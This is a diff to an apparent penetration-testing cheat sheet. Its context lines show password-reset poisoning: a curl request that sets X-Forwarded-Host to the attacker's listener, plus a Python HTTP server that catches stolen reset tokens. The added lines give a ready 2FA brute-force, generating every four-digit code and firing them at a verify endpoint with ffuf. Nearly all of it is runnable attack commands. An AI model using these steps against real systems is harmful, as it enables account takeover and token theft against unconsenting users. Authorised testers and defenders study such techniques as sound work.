@@ -44,3 +44,13 @@ curl -X POST <target>/forgot-password -H 'X-Forwarded-Host: <your-listener>' -d 
 python3 -m http.server 80     # victim's mail client/server fetches the link preview, or the victim clicks it -> token hits your listener's access log
 ```
 Try `X-Forwarded-Host` first, then plain `Host` if that's ignored — which one the app trusts varies by stack/proxy config.
+
+2FA brute-force via FFuF when there's no rate limiting or code invalidation:
+```bash
+# capture the 2FA POST request, note the parameter name (e.g. "code")
+seq -w 0 9999 | awk '{printf "%04d\n",$1}' > 4digits.txt
+ffuf -w 4digits.txt -u http://<TARGET>/verify -X POST -d 'code=FUZZ' \
+  -b '<session-cookie>' -H 'Content-Type: application/x-www-form-urlencoded' \
+  -fw <wrong-response-wordcount>
+# -fw filters out wrong-code responses by word count (get the baseline from one wrong attempt)
+```
